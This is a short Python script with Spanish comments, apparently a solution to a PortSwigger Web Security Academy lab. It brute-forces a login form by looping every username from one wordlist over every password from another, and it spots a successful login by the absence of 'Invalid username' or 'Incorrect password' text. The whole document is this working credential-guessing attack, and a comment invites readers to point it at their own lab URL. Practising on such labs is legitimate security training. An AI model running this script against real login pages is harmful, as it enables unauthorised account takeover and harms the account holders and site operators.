import requests
from requests.exceptions import HTTPError

def autenticacion():
    urlLogin = "https://0a0d00b30341d21a8155755200d400d8.web-security-academy.net/login" #Si quieren probar el código, aquí debiesen cambiar la URL por la que les genere al momento de iniciar el lab.

    with open('usuarios_noborrar.txt', 'r') as usuarios:
        listaUsuarios = usuarios.readlines()
        for usuario in listaUsuarios:
            usuario = usuario.strip()
            with open('passwords_db.txt', 'r') as claves:
                listaClaves = claves.readlines()
                for clave in listaClaves:
                    clave = clave.strip()
                    s = requests.Session()
                    data = {"username": usuario, "password": clave}

                    try:
                        req = s.post(urlLogin, data=data, allow_redirects=True)
                        if "Invalid username" in req.text or "Incorrect password" in req.text:
                            print(f"no me sirvio el usuario {usuario} y la clave: {clave}")
                        else:
                            print(f" me conecto con este usuario {usuario} y la clave: {clave}")
                            return 
                    except HTTPError as e:
                        print(f"Error al hacer la solicitud: {e}")
def main():
    autenticacion()

if __name__ == "__main__":
    main()
